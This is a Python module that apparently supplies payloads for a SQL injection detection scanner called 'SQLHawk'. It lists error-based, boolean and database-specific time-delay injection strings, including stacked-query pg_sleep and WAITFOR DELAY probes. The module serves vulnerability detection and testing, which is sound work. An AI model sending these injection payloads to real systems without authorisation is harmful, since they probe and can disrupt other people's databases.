"""
Payload sets used by SQLHawk.

Kept intentionally to classic, well-known detection payloads (the same
ones documented in OWASP's testing guide) — enough to reliably *detect*
that a parameter is unsafe, without being an exploitation/dump toolkit.
"""

ERROR_BASED_PAYLOADS = [
    "'",
    "\"",
    "')",
    "\")",
    "' OR '1'='1",
    "' OR '1'='1' -- ",
    "\" OR \"1\"=\"1",
    "' AND '1'='2",
]

BOOLEAN_TRUE_PAYLOAD = "' OR '1'='1"
BOOLEAN_FALSE_PAYLOAD = "' AND '1'='2"

# %s is substituted with a delay in seconds
TIME_BASED_PAYLOADS = {
    "MySQL": "' OR SLEEP(%d)-- -",
    "PostgreSQL": "'; SELECT pg_sleep(%d)-- -",
    "MSSQL": "'; WAITFOR DELAY '0:0:%d'-- -",
    "Generic": "' OR SLEEP(%d)-- -",
}
